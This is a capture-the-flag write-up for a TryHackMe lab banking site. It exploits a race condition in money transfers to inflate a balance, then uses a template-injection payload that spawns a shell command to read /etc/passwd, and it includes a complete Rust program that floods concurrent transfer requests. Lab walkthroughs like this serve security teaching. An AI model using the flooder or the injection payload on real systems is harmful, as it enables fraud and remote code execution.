# Racetrack Bank

A Hard-rated room.

https://tryhackme.com/room/racetrackbank

Only ports 22 and 80 are open, and on 80 is a banking website where you can create a user, login and send money to other users. On new account creation it gives you 1 gold. Additionally, there is the ability to purchase 'premium' features for 10000 gold. Going by the name, this was some sort of race condition most likely in transferring money.

To bypass this, I created two users: one with the name and password `test` and the other with `test2`. Then I wrote a Rust program that would make concurrent webrequests from one to the other, sending the maximum amount of gold as many times as possible (~20 times over the VPN). Doing this back and forth only a couple of times was sufficient to give user `test` over 10000 gold... the code is in the appendix below.

Once done, I could buy the premium feature, which turned out to be a simple calculator field. Given that the server reports itself as running express, a nodejs web framework, I tried an injection payload which worked to achieve RCE: `{{root.process.mainModule.require('child_process').spawnSync('cat',['/etc/passwd']).stdout}}`.



## Rust race condition exploiter.

This requires the following cargo.toml dependencies:

```yaml
[dependencies]
anyhow = "1.0.70"
futures = "0.3.27"
reqwest = "0.11.15"
tokio = { version = "1.26.0", features = ["macros", "rt-multi-thread"] }
```

Ensure the appropriate users are created, and update the constant url in the code before running:

```rust
use std::collections::HashMap;
use anyhow::Result;

use futures::{stream, StreamExt};
use reqwest::{Proxy, header::COOKIE, redirect::Policy, Client};

const CONCURRENT: usize = 20;
const SITE_URL: &str = "http://10.10.57.199";

async fn client() -> Result<Client> {
    Ok(reqwest::Client::builder()
        .redirect(Policy::none())
        .build()?)
}

fn page_url(page: &str) -> String {
    format!("{}/{}", SITE_URL, page)
}

#[tokio::main]
async fn main() -> Result<()> {

    let user1 = get_auth_cookie("test").await?;
    let user2 = get_auth_cookie("test2").await?;

    let mut gold1 = get_gold_amount(&user1).await?;
    while gold1 < 10000 {
        println!("{gold1}");
        race_send(&user1, "test2", gold1).await?;
        let gold2 = get_gold_amount(&user2).await?;
        race_send(&user2, "test", gold2).await?;
        gold1 = get_gold_amount(&user1).await?;
    }    

    println!("done");
    Ok(())
}

async fn get_auth_cookie(username: &str) -> Result<String> {
    let client = client().await?;
    let mut params = HashMap::new();
    params.insert("username", username);
    params.insert("password", username);
    let resp = client.post(page_url("api/login")).form(&params).send().await?;

    let cookie = &resp.headers()["set-cookie"];
    let cookie = cookie.to_str().unwrap().to_string();
    Ok(cookie[..cookie.find(";").unwrap()+1].to_string())
}

async fn get_gold_amount(cookie: &str) -> Result<i32> {
    let client = client().await?;
    let resp = client.get(page_url("home.html")).header(COOKIE, cookie).send().await?;

    let body = resp.text().await?;
    let pos = body.find("Gold: ").unwrap();
    let pos2 = body[pos+6..].find("</a>").unwrap();
    let text = &body[pos+6..pos+pos2].trim();
    Ok(text.parse::<i32>().unwrap())
}

async fn race_send(cookie: &str, target_user: &str, amount: i32) -> Result<()> {
    let tasks = vec![(&cookie, &target_user, amount); CONCURRENT];
    let futures = 
        tasks.iter().map(|(cookie, target_user, amount)| async move {
            let client = reqwest::Client::builder()
            .redirect(Policy::none())
            .build().unwrap();

            let mut params = HashMap::new();
            params.insert("user", (**target_user).to_string());
            params.insert("amount", format!("{}", amount));
            client.post(page_url("api/givegold")).header(COOKIE, **cookie).form(&params).send().await.expect("failed to call");
        });
        
    stream::iter(futures).buffer_unordered(CONCURRENT).collect::<()>().await;
    Ok(())
}
```
